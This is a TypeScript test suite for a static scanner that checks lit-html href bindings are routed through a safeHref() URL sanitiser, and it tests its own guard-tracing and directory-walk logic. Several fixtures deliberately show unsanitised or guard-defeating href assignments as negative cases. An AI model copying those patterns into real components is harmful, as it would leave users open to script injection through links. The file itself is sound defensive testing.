    ['property write, not a local', 'el.href = safeHref(url);'],
    ['comparison', 'if (href === safeHref(url)) return;'],
    ['a different function', 'const href = maybeSafeHref(url);'],
  ];
  for (const [name, fixture] of notGuarded) {
    assert(
      !assignsFromSafeHref(fixture, 'href'),
      `fixture "${name}" was accepted as a guard but reinstates or never applies it: ${fixture}`,
    );
  }

  // A commented-out guard must not count. blankNonCode is what makes this true,
  // and it is applied to the whole file text before matching.
  assert(
    !assignsFromSafeHref(blankNonCode('// const href = safeHref(url);'), 'href'),
    'a commented-out assignment was accepted as a guard',
  );
  // The docblock case, WHICH USED TO PASS FOR THE WRONG REASON. The old spelling
  // was blankNonCode(' * e.g. `const href = safeHref(url);`') on that line alone.
  // A single line of a docblock has no `/*` on it, so nothing was blanked; the
  // fixture was rejected only because the stray trailing backtick failed the
  // "nothing may follow but terminators" tail check. Move the backticks and it
  // passed. Blanking the whole comment, as a whole-text call does, is what makes
  // this a real assertion.
  const docblock = [
    '/**',
    ' * Example: const href = safeHref(url);',
    ' */',
    'const href = raw;',
  ].join('\n');
  const docblockBlanked = blankNonCode(docblock).split('\n');
  assert(
    !assignsFromSafeHref(docblockBlanked[1]!, 'href'),
    'a docblock example was accepted as a guard; blankNonCode is not seeing the comment: ' +
      JSON.stringify(docblockBlanked[1]),
  );
  // ...and the positive control for that same call: the live line below the
  // docblock must survive, or the rejection above is vacuous.
  assert(
    isAssignmentTo(docblockBlanked[3]!, 'href'),
    'blankNonCode blanked live code following a docblock: ' + JSON.stringify(docblockBlanked[3]),
  );
  // Positive control for blankNonCode: it must not blank live code.
  assert(
    assignsFromSafeHref(blankNonCode('const href = safeHref(url); // guarded'), 'href'),
    'blankNonCode destroyed a real assignment; every rejection above would then be vacuous',
  );

  // blankNonCode must not lose braces to an apostrophe in template TEXT. This is
  // the review's depth -1 finding: `don't` opened a quote run that swallowed the
  // `${` on the same line while its `}` on a later line survived.
  const apostrophe = ['function f() {', "  return html`<p>don't ${", '    x', '  }</p>`;', '}'].join(
    '\n',
  );
  const apostropheBlanked = blankNonCode(apostrophe);
  let depth = 0;
  for (const c of apostropheBlanked) {
    if (c === '{') depth++;
    else if (c === '}') depth--;
  }
  assert(
    depth === 0,
    `an apostrophe in template text skewed brace depth to ${depth}; enclosingBlock would ` +
      'then select the wrong opening brace and WIDEN the block, which is the fail-open ' +
      `direction:\n${apostropheBlanked}`,
  );

  // The D1(b) finding: block scope must be the method, not the whole class.
  const classText = [
    'class Probe extends LitElement {', // 1
    '  renderGuarded() {', // 2
    '    const href = safeHref(this.a);', // 3
    '    return html`<a href=${href}>a</a>`;', // 4
    '  }', // 5
    '', // 6
    '  renderBare() {', // 7
    '    const href = this.b;', // 8
    '    return html`<a href=${href}>b</a>`;', // 9
    '  }', // 10
    '}', // 11
  ];
  const bareBlock = enclosingBlock(classText, 9);
  assert(
    !bareBlock.some((l) => assignsFromSafeHref(l, 'href')),
    'the enclosing block of an unguarded binding reached a sibling method\'s guard, ' +
      'so one guarded method would launder every bare binding in the class:\n' +
      bareBlock.join('\n'),
  );
  // Positive control: the guarded method's own block must still find its guard,
  // or the scoping is simply too tight and every viaSafeHref entry would fail.
  const guardedBlock = enclosingBlock(classText, 4);
  assert(
    guardedBlock.some((l) => assignsFromSafeHref(l, 'href')),
    'the enclosing block of a guarded binding lost its own guard:\n' + guardedBlock.join('\n'),
  );

  testMultiStatementGuards();
  testStructuralHelpers();
}

/**
 * Fixtures for three pieces that are VACUOUS ON THIS TREE and would otherwise be
 * pins in name only. Each is a backstop against an input web/src does not
 * currently contain, so the tree scan cannot exercise any of them; without these
 * they could all be deleted with the suite staying green.
 */
function testStructuralHelpers(): void {
  // (a) assertBraceBalanced. No file under web/src is unbalanced after
  // blankToCode -- measured -- so nothing in the scan ever reaches the throw.
  let threw = false;
  try {
    assertBraceBalanced('function f() {\n  g();\n', 'fixture');
  } catch {
    threw = true;
  }
  assert(threw, 'assertBraceBalanced accepted an unclosed brace');
  threw = false;
  try {
    // The running total must be checked, not just the final one. This input
    // ENDS at depth 0 and dips to -1 in the middle, which is exactly what a
    // mis-parse that swallows one `{` and later restores balance looks like.
    // With only the final check, mutant M5cn survived on `'}\n'` because that
    // input also ends non-zero; this one does not let it.
    assertBraceBalanced('}\nfunction f() {\n', 'fixture');
  } catch {
    threw = true;
  }
  assert(threw, 'assertBraceBalanced accepted a closing brace with no opener');
  // Positive control, or the two rejections above prove only that it always
  // throws -- which would fail the whole scan, not pass it, but the pin should
  // still say which way it discriminates.
  assertBraceBalanced('function f() {\n  if (a) { g(); }\n}\n', 'fixture');

  // (b) The source-file extension filter. web/src is 100% `.ts` today, so
  // widening it changed nothing measurable (52 files before and after) and a
  // revert would be invisible.
  for (const name of ['a.ts', 'a.tsx', 'a.mts', 'a.cts', 'a.js', 'a.jsx', 'a.mjs', 'a.cjs']) {
    assert(SOURCE_EXT.test(name), `${name} is not recognised as a source file`);
  }
  for (const name of ['a.test.ts', 'a.test.tsx', 'a.test.mjs']) {
    assert(TEST_FILE.test(name), `${name} is not recognised as a test file`);
  }
  for (const name of ['a.css', 'a.json', 'a.d.ts.map', 'README.md']) {
    assert(!SOURCE_EXT.test(name), `${name} was wrongly recognised as a source file`);
  }
  assert(!TEST_FILE.test('latest.ts'), 'TEST_FILE matched a name merely ending in "test.ts"');

  // (c) Identifier escaping. `$` is legal in a JS identifier and is an anchor in
  // a RegExp; unescaped, the assignment regex for `$el` matched nothing and
  // every check on it passed vacuously. No identifier in web/src contains one.
  assert(isAssignmentTo('  $href = url;', '$href'), 'an assignment to a $-identifier was missed');
  assert(
    assignsFromSafeHref('  $href = safeHref(url);', '$href'),
    'a guarded assignment to a $-identifier was missed',
  );
  assert(!isAssignmentTo('  xhref = url;', '$href'), '$-identifier matching is too loose');

  // (d) compareWalk's three arms, each fired in isolation. On the real tree all
  // three are silent by construction, so nothing there distinguishes a working
  // arm from a deleted one -- and the per-directory arm, which is the whole
  // count-neutrality argument for the anti-vacuity check, was measured surviving
  // deletion (M6cn) before these existed.
  const base = new Map([
    ['.', 2],
    ['util', 6],
    ['store', 4],
  ]);
  const clean = compareWalk(base, new Map(base));
  assert(
    clean.missed.length === 0 && clean.extra.length === 0 && clean.skewed.length === 0,
    'compareWalk reported a difference between a census and itself: ' + JSON.stringify(clean),
  );

  const dropped = compareWalk(base, new Map([...base].filter(([d]) => d !== 'store')));
  assert(
    dropped.missed.join() === 'store' && dropped.skewed.join() === 'store: census 4, walk 0',
    'compareWalk did not report a skipped directory: ' + JSON.stringify(dropped),
  );

  const unknown = compareWalk(base, new Map([...base, ['ghost', 1]]));
  assert(
    unknown.extra.join() === 'ghost',
    'compareWalk did not report a directory the census never saw: ' + JSON.stringify(unknown),
  );

  // The count-neutral one: same total (12), same directory set, files moved
  // between directories. `missed` and `extra` are both empty; only the
  // per-directory arm can see this.
  const shuffled = compareWalk(
    base,
    new Map([
      ['.', 2],
      ['util', 4],
      ['store', 6],
    ]),
  );
  assert(
    shuffled.missed.length === 0 && shuffled.extra.length === 0,
    'the count-neutral fixture is not count-neutral; it fired the wrong arm: ' +
      JSON.stringify(shuffled),
  );
  assert(
    shuffled.skewed.length === 2,
    'compareWalk missed a count-neutral redistribution -- the walk could lose a whole ' +
      'directory of files and pad the total back from somewhere else: ' + JSON.stringify(shuffled),
  );
}

/** What the two-arm viaSafeHref check concludes about a binding. */
type Verdict = 'approved' | 'no-guard' | 'defeated';

interface Trace {
  readonly verdict: Verdict;
  /** Non-empty only when the verdict is 'defeated'. */
  readonly defeats: readonly { readonly lineNo: number; readonly text: string }[];
  /** The innermost enclosing block, blanked, for the failure message. */
  readonly block: readonly string[];
}

/**
 * THE viaSafeHref DECISION. Both the tree scan and the fixture table below call
 * this, and that is deliberate rather than tidiness: an earlier draft had the
 * fixtures re-implement the two arms, which meant deleting an arm from the tree
 * scan left every fixture green. Fixtures that paraphrase the thing they guard
 * are not guarding it.
 */
function traceGuard(src: string, id: string, lineNo: number, what: string): Trace {
  const blanked = blankToCode(src).split('\n');

  // ARM 1, EXISTENTIAL, innermost block: the guard must exist, and it must be
  // near this binding rather than in a sibling method. Block scope is the
  // strict direction here; see enclosingBlock.
  const block = enclosingBlock(blanked, lineNo, what);
  if (!block.some((l) => assignsFromSafeHref(l, id))) {
    return { verdict: 'no-guard', defeats: [], block };
  }

  // ARM 2, UNIVERSAL, WHOLE FILE: no assignment to this identifier anywhere in
  // the file may be anything other than that guard.
  //
  // Arm 1 alone is what deliverable 0 measured green on this exact shape:
  //
  //     let href = safeHref(url);
  //     href = url;
  //     return html`<a href=${href} ...>`;
  //
  // -- exit 0, "url-binding-scan: ok". The existential is satisfied by line 1
  // and line 2 is never looked at.
  //
  // FILE SCOPE, NOT BLOCK SCOPE, and this is the opposite of arm 1 on purpose.
  // Once the predicate is universal the scope direction inverts: a narrow scope
  // stops looking before it reaches the defeat, so narrow is now the FAIL-OPEN
  // direction. Concretely, a defeating `href = url` in the enclosing function,
  // with the guarded assignment inside a loop body, satisfies both a
  // block-scoped positive and a block-scoped negative while the first iteration
  // renders unguarded -- that is a row in the fixture table below. File scope
  // has a cost: two legitimate, separately-guarded `href` locals in one file
  // would collide. That cost is the correct one to pay -- it fails closed,
  // loudly, and is fixed by renaming or by a second ALLOWED entry. Measured on
  // this tree: ft-inspector-code.ts and ft-inspector-meta.ts each contain
  // exactly one assignment to `href`, so nothing legitimate is caught today.
  const defeats = defeatingAssignments(blanked, id);
  if (defeats.length > 0) return { verdict: 'defeated', defeats, block };

  return { verdict: 'approved', defeats: [], block };
}

/** Locates the `${id}` binding in fixture text and traces it. */
function traceFixture(src: string, id: string): Verdict {
  const lineNo =
    src.split('\n').findIndex((l) => new RegExp(`=\\$\\{${reEscape(id)}\\}`).test(l)) + 1;
  if (lineNo === 0) throw new Error(`fixture has no \`=\${${id}}\` binding:\n${src}`);
  return traceGuard(src, id, lineNo, 'fixture').verdict;
}

/**
 * MULTI-STATEMENT GUARD FIXTURES -- the shapes the existential check could not
 * see. Round 3 closed the single-line defeat (`safeHref(url) || url`) inside
 * assignsFromSafeHref and left every multi-statement spelling wide open; the
 * table above is entirely single lines, so it could not have caught that.
 *
 * These are as blocking as the predicate. A future edit that quietly restores
 * the `.some()` turns the 'defeated' rows red.
 */
function testMultiStatementGuards(): void {
  const cases: ReadonlyArray<readonly [string, Verdict, string]> = [
    [
      'guard only',
      'approved',
      ['function f(url) {', '  const href = safeHref(url);', '  return html`<a href=${href}>x</a>`;', '}'].join(
        '\n',
      ),
    ],
    [
      'guard, then reassignment from the raw value (deliverable 0)',
      'defeated',
      [
        'function f(url) {',
        '  let href = safeHref(url);',
        '  href = url;',
        '  return html`<a href=${href}>x</a>`;',
        '}',
      ].join('\n'),
    ],
    [
      'guard, then conditional reassignment',
      'defeated',
      [
        'function f(url, fallback) {',
        '  let href = safeHref(url);',
        '  if (!href) href = fallback;',
        '  return html`<a href=${href}>x</a>`;',
        '}',
      ].join('\n'),
    ],
    [
      'guard, then reassignment inside a nested block',
      'defeated',
      [
        'function f(urls) {',
        '  let href = safeHref(urls[0]);',
        '  for (const u of urls) {',
        '    href = u;',
        '  }',
        '  return html`<a href=${href}>x</a>`;',
        '}',
      ].join('\n'),
    ],
    [
      'let guarded on one branch and bare on the other',
      'defeated',
      [
        'function f(url, cond) {',
        '  let href;',
        '  if (cond) {',
        '    href = safeHref(url);',
        '  } else {',
        '    href = url;',
        '  }',
        '  return html`<a href=${href}>x</a>`;',
        '}',
      ].join('\n'),
    ],
    [
      // The shape that motivates FILE scope for arm 2. Under block scope both
      // arms are satisfied: the loop body holds the guard, and the defeating
      // assignment sits outside the innermost block the binding is in.
      'defeat in the enclosing function, guard in the loop body',
      'defeated',
      [
        'function f(urls, raw) {',
        '  let href = raw;',
        '  return urls.map((u) => {',
        '    href = safeHref(u);',
        '    return html`<a href=${href}>x</a>`;',
        '  });',
        '}',
      ].join('\n'),
    ],
    [
      // Arm 1's scope, driven through the real decision function. The direct
      // enclosingBlock fixture above does not reach traceGuard, so widening
      // arm 1 INSIDE traceGuard survived it -- measured GREEN as mutant M3.
      // Bare method first, so this is the binding traceFixture picks up.
      'bare binding, guard in a sibling method',
      'no-guard',
      [
        'class Probe extends LitElement {',
        '  renderBare() {',
        '    const href = this.b;',
        '    return html`<a href=${href}>b</a>`;',
        '  }',
        '',
        '  renderGuarded() {',
        '    const href = safeHref(this.a);',
        '    return html`<a href=${href}>a</a>`;',
        '  }',
        '}',
      ].join('\n'),
    ],
    [
      'no guard at all',
      'no-guard',
      ['function f(url) {', '  const href = url;', '  return html`<a href=${href}>x</a>`;', '}'].join(
        '\n',
      ),
    ],
    [
      // Precision control: reassignment FROM THE GUARD is still a guard. Without
      // this row the universal arm could be implemented as "at most one
      // assignment" and every row above would still pass.
      'guarded twice',
      'approved',
      [
        'function f(a, b, cond) {',
        '  let href = safeHref(a);',
        '  if (cond) href = safeHref(b);',
        '  return html`<a href=${href}>x</a>`;',
        '}',
      ].join('\n'),
    ],
    [
      // Precision control: an unrelated PROPERTY write must not read as a defeat,
      // or the arm would be unusable on any real component.
      'property write on another object',
      'approved',
      [
        'function f(url, el) {',
        '  const href = safeHref(url);',
        '  el.href = url;',
        '  return html`<a href=${href}>x</a>`;',
        '}',
      ].join('\n'),
    ],
  ];

  for (const [name, want, src] of cases) {
    const got = traceFixture(src, 'href');
    assert(
      got === want,
      `multi-statement fixture "${name}": expected ${want}, got ${got}.\n${src}`,
    );
  }

  // ANTI-VACUITY ON THIS TABLE. Each verdict must actually occur, or a bug that
  // collapsed traceGuard to a constant would pass some rows by luck.
  for (const want of ['approved', 'no-guard', 'defeated'] as const) {
    assert(
      cases.some(([, v]) => v === want),
      `the multi-statement table has no "${want}" row, so that outcome is never proven`,
    );
  }
}

/** Files per directory, relative to `root`, for a list of absolute paths. */
function tally(root: string, files: readonly string[]): Map<string, number> {
  const out = new Map<string, number>();
  for (const f of files) {
    const dir = relative(root, dirname(f)) || '.';
    out.set(dir, (out.get(dir) ?? 0) + 1);
  }
  return out;
}

interface WalkDiff {
  /** Directories the census found source files in that the walk never reached. */
  readonly missed: readonly string[];
  /** Directories the walk produced files in that the census does not know about. */
  readonly extra: readonly string[];
  /** Directories where the two disagree on how many files there are. */
  readonly skewed: readonly string[];
}

/**
 * Compares the scanner's walk against the independent census.
 *
 * Extracted from the assertions that consume it so it can be driven by
 * fixtures. Inline, the per-directory arm was VACUOUS: no mutant produced a
 * count skew without also producing a missing directory, so disabling that arm
 * survived (measured GREEN as mutant M6cn) -- the arm most of the anti-vacuity
 * argument rests on was the one nothing exercised.
 */
function compareWalk(census: Map<string, number>, reached: Map<string, number>): WalkDiff {
  return {
    missed: [...census.keys()].filter((d) => !reached.has(d) && census.get(d)! > 0),
    extra: [...reached.keys()].filter((d) => !census.has(d)),
    skewed: [...census.entries()]
      .filter(([dir, n]) => (reached.get(dir) ?? 0) !== n)
      .map(([dir, n]) => `${dir}: census ${n}, walk ${reached.get(dir) ?? 0}`),
  };
}

function testNoUnapprovedBindings(): void {
  const files = sourceFiles(SRC);
  assert(files.length > 0, 'scanner found no source files -- the walk is broken');

  const findings: Finding[] = [];
  for (const file of files) {
    findings.push(...scanText(relative(SRC, file), readFileSync(file, 'utf8')));
  }

  // ANTI-VACUITY, ON THE WALK.
  //
  // This used to be `findings.length >= ALLOWED.length`, justified as "the scan
  // must see the bindings we know exist; otherwise a silently broken walk would
  // report a clean tree". Both halves of that were wrong at once. It does not
  // detect a broken walk -- ALLOWED has four entries and the tree has four
  // matching lines, so any walk that happens to reach ft-toolbar.ts and the two
  // inspector files satisfies it while missing every other directory. And the
  // inequality is not even the right shape: it is satisfied trivially the
  // moment findings exceed the allow-list, which is the situation the NEXT
  // assertion exists to fail on.
  //
  // The replacement was `files.length >= 40` plus three named witness files.
  // That is still a COUNT, and a count cannot constrain identity. Measured:
  // making sourceFiles() skip store/, gen/ and kanban/ drops 11 of 52 files,
  // leaves 41, clears the floor of 40, still reaches all three witnesses, and
  // stays GREEN with a real unguarded `href=${raw}` planted in the skipped
  // store/. Three witnesses also cover 3 of the 12 directories that hold source
  // files -- the other 9 could vanish silently.
  //
  // So the binding is now on the TREE, computed by an independent traversal
  // (see directoryCensus): every directory must be reached, and each must
  // contribute exactly the number of files that are actually on disk. A mutant
  // that skips a directory now fails by name. A mutant that redistributes files
  // to hold the total fixed fails too, because the comparison is per directory.
  const census = directoryCensus(SRC);

  // Backstop, and the only remaining magic number: if BOTH walks were broken in
  // the same way the comparison below would be vacuously satisfied. This floors
  // the independent walk's own output. Measured at this commit: 13 directories
  // (src/ itself plus 12), 52 files.
  const MIN_DIRS = 10;
  const MIN_FILES = 40;
  const censusFiles = [...census.values()].reduce((a, b) => a + b, 0);
  assert(
    census.size >= MIN_DIRS && censusFiles >= MIN_FILES,
    `the independent directory census found ${census.size} directories and ${censusFiles} ` +
      `source files, expected at least ${MIN_DIRS} and ${MIN_FILES}. Both walks would have ` +
      'to be broken for this to fire, so treat it as "the tree really shrank" only after ' +
      'checking readdirSync -- otherwise every assertion below is vacuous.',
  );

  // Directories reached, by name. Not a count.
  const cmp = compareWalk(census, tally(SRC, files));
  assert(
    cmp.missed.length === 0,
    `the scanner's walk never reached ${cmp.missed.length} of the ${census.size} directories ` +
      `under web/src that contain source files: ${cmp.missed.join(', ')}. Everything in them ` +
      'is unscanned, and the tree only looks clean.',
  );
  assert(
    cmp.extra.length === 0,
    `the scanner's walk produced files in ${cmp.extra.join(', ')}, which the independent ` +
      'census did not find. The two walks disagree about the shape of the tree; fix that ' +
      'before trusting either.',
  );
  assert(
    cmp.skewed.length === 0,
    "the scanner's walk and the independent census disagree on how many source files " +
      `each directory holds:\n  ${cmp.skewed.join('\n  ')}\n` +
      'A file that one walk sees and the other does not is a file that may be unscanned.',
  );

  const unapproved = findings.filter(
    (f) => !ALLOWED.some((a) => a.file === f.file && a.line === f.line),
  );

  assert(
    unapproved.length === 0,
    'Unapproved URL-bearing binding(s) found. Route the value through safeHref() ' +
      'from util/safe-url.js, or add an entry to ALLOWED with a justification:\n' +
      unapproved.map((f) => `  ${f.file}:${f.lineNo} [${f.rule}] ${f.line}`).join('\n'),
  );

  // Every allow-list entry must still correspond to real code, so entries do not
  // rot into permanent exemptions after the code they describe has moved -- and
  // to EXACTLY ONE line, so one approved line cannot launder a second identical
  // line pasted in beside it.
  //
  // (An audit finding asked for a line number on each entry instead. A pinned
  // line number churns on every edit above the binding and buys nothing once
  // uniqueness is enforced, so uniqueness is what is enforced; the real line
  // numbers are reported in the failure messages, where they are useful.)
  for (const a of ALLOWED) {
    const matches = findings.filter((f) => f.file === a.file && f.line === a.line);
    assert(
      matches.length > 0,
      `stale ALLOWED entry, no longer present in the tree: ${a.file} :: ${a.line}`,
    );
    assert(
      matches.length === 1,
      `ambiguous ALLOWED entry: ${a.file} :: ${a.line}\n` +
        `matches ${matches.length} lines (${matches.map((m) => m.lineNo).join(', ')}). ` +
        'One approval must not cover several bindings -- they can be reviewed ' +
        'separately and can diverge. Make the lines distinguishable, or route ' +
        'them all through safeHref().',
    );
  }

  // An allow-list entry claiming to go through safeHref must actually route THIS
  // binding through it, not merely import it somewhere in the file.
  for (const a of ALLOWED.filter((x) => x.viaSafeHref)) {
    checkViaSafeHref(a, findings.find((f) => f.file === a.file && f.line === a.line)!.lineNo, () =>
      readFileSync(join(SRC, a.file), 'utf8'),
    );
  }
}

/**
 * The per-entry viaSafeHref check, as a function a fixture can drive.
 *
 * WHY IT IS A FUNCTION. Inline in the loop above, the two consuming assertions
 * were UNKILLABLE. Replacing either condition with `true` -- or with a
 * differently-spelled tautology like `trace.defeats.length >= 0`, which the type
 * checker has no opinion about -- left the suite green at exactly 358
 * assertions, because on a clean tree neither assertion ever has anything to
 * report and no fixture reached them. The fixture table drives traceGuard, which
 * decides; nothing drove the code that ACTS on the decision. That is the same
 * shape as the defect this whole round exists to remove: an instrument that
 * cannot be shown to be plugged in.
 *
 * Taking `read` as a parameter rather than calling readFileSync is what makes it
 * drivable: testViaSafeHrefConsumption below hands it a synthetic file whose
 * guard is defeated and requires this to throw.
 */
function checkViaSafeHref(a: Allowed, lineNo: number, read: () => string): void {
  const text = read();
  assert(
    text.includes("from '../../util/safe-url.js'") || text.includes("from '../util/safe-url.js'"),
    `${a.file} is allow-listed as using safeHref but does not import it`,
  );

  const id = interpolatedIdentifier(a.line);
  assert(
    id !== undefined,
    `${a.file}:${lineNo} is marked viaSafeHref but does not interpolate a bare ` +
      `identifier, so the guard cannot be traced: ${a.line}`,
  );

  // Both arms live in traceGuard, which the fixture table in
  // testMultiStatementGuards drives too -- so a future edit that weakens either
  // arm turns those fixtures red as well as this scan.
  const trace = traceGuard(text, id!, lineNo, a.file);

  assert(
    trace.verdict !== 'no-guard',
    `${a.file}:${lineNo} is allow-listed as "href comes from safeHref()", but ` +
      `nothing in the enclosing block assigns ${id} from safeHref() AND NOTHING ELSE. ` +
      'The file importing safeHref is not enough -- a file can guard one binding and ' +
      'leave the next one bare. Neither is an initialiser that merely starts with a ' +
      `safeHref call: \`${id} = safeHref(x) || x\` reinstates the unvalidated value and ` +
      `used to pass here.\n  binding: ${a.line}\n  block:\n${trace.block.join('\n')}`,
  );

  assert(
    trace.verdict !== 'defeated',
    `${a.file}:${lineNo} is allow-listed as "href comes from safeHref()", and a ` +
      `guarded assignment does exist -- but ${id} is also assigned from something else ` +
      'elsewhere in the file, which throws the guard away:\n' +
      trace.defeats.map((d) => `  ${a.file}:${d.lineNo} ${d.text}`).join('\n') +
      `\nEvery assignment to ${id} in this file must be \`${id} = safeHref(...)\` and ` +
      'nothing more. Rename the unrelated local if this is a false positive.',
  );
}

/**
 * Drives checkViaSafeHref with inputs that must be REJECTED, so that the
 * assertions inside it are exercised by something other than a clean tree.
 *
 * Each case is the exact source shape of a mutant that previously survived, or
 * of a defect the round was convened to close. `deliverable 0` is the file the
 * fix leg planted at 6805daa and measured green.
 */
function testViaSafeHrefConsumption(): void {
  const entry = (line: string): Allowed => ({
    file: 'fixture.ts',
    line,
    reason: 'fixture',
    viaSafeHref: true,
  });
  const BINDING = 'return html`<a href=${href}>probe</a>`;';
  const IMPORT = "import { safeHref } from '../util/safe-url.js';";

  const cases: ReadonlyArray<readonly [string, Allowed, string, string]> = [
    [
      'deliverable 0: guard, then reassignment from the raw value',
      entry(BINDING),
      [IMPORT, 'export function f(url) {', '  let href = safeHref(url);', '  href = url;', `  ${BINDING}`, '}'].join('\n'),
      'throws the guard away',
    ],
    [
      'no guard at all',
      entry(BINDING),
      [IMPORT, 'export function f(url) {', '  const href = url;', `  ${BINDING}`, '}'].join('\n'),
      'nothing in the enclosing block assigns',
    ],
    [
      'allow-listed as viaSafeHref but the file does not import it',
      entry(BINDING),
      ['export function f(url) {', '  const href = safeHref(url);', `  ${BINDING}`, '}'].join('\n'),
      'does not import it',
    ],
    [
      'binding does not interpolate a bare identifier, so nothing can be traced',
      entry('return html`<a href=${safeHref(this.url)}>probe</a>`;'),
      [IMPORT, 'export function f() {', '  return html`<a href=${safeHref(this.url)}>probe</a>`;', '}'].join('\n'),
      'does not interpolate a bare',
    ],
  ];

  for (const [name, a, src, expect] of cases) {
    let message: string | undefined;
    const lineNo = src.split('\n').findIndex((l) => l.trim() === a.line.trim()) + 1;
    try {
      checkViaSafeHref(a, lineNo || src.split('\n').length, () => src);
    } catch (e) {
      message = (e as Error).message;
    }
    assert(
      message !== undefined,
      `checkViaSafeHref ACCEPTED a binding it must reject -- "${name}". The tree scan ` +
        `would approve this file:\n${src}`,
    );
    assert(
      message!.includes(expect),
      `checkViaSafeHref rejected "${name}" for the wrong reason: expected a message ` +
        `containing ${JSON.stringify(expect)}, got:\n${message}`,
    );
  }

  // Positive control. Without it, `checkViaSafeHref` could be a function that
  // always throws and every assertion above would still pass -- while the tree
  // scan failed, admittedly, but the fixtures would not be the reason.
  const good = [
    IMPORT,
    'export function f(url) {',
    '  const href = safeHref(url);',
    `  ${BINDING}`,
    '}',
  ].join('\n');
  checkViaSafeHref(entry(BINDING), 4, () => good);
}

function run(): void {
  testPositiveFixtures();
  testGuardTracing();
  testNoUnapprovedBindings();
  testViaSafeHrefConsumption();
  console.log('url-binding-scan: ok');
}

run();
